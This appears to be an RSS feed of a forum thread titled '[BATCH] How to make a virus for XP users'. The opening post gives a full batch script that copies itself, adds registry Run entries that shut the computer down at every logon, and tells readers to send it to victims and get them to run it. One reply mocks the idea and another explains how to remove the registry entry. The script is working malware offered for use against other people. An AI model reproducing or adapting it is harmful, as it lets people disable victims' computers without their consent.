channel.title: [BATCH] How to make a virus for XP users
channel.description:
Posted this on sythe as well:
This will work on any victim who is running Windows XP and has admin priveleges. Create a new text file in notepad and paste this: [code]@ECHO off CLS COPY %0 C:\%0_1.bat ECHO REGEDIT4 >> temp.reg ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> temp.reg ECHO "ownage"="shutdown.exe -s -t 00" >> temp.reg ECHO [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> temp.reg ECHO "ownage"="shutdown.exe -s -t 00" >> temp.reg ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> temp.reg ECHO "backup1"="C:\%0_1.bat" >> temp.reg REGEDIT.EXE /s temp.reg SHUTDOWN.EXE -s -t 00 [/code]
Save it as whatever.bat and send it to the victims computer. Tell them to run it and it will shut down their computer every time they log in!

item.title: [BATCH] How to make a virus for XP users
item.dc:creator: @nade nade
item.description:
@nade wrote:

A batch virus? What the fuck are you talking about? You can find source codes to almost every huge virus outbreak ever. This is ridiculous nobody writes viruses in batch. It’s plain retarted. Who is stupid enough to open a batch file without looking what’s in it first. Easy to fix, since it depends on windows reading the ‘current version/run’ key to execute it each time. Make batch files isn’t programming, batches are basicly something you use instead of Windows Explorer. Way to go and add a dumbass thread to a forum that is already infested with crap.

Read full topic

item.title: [BATCH] How to make a virus for XP users
item.dc:creator: @suck_my_r2h suck my r2h
item.description:
@suck_my_r2h wrote:

Press F8 repeadetly after the BIOS loads but before Windows does. Then log on as adminstrator, and delete the reference to shutdown.exe in HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
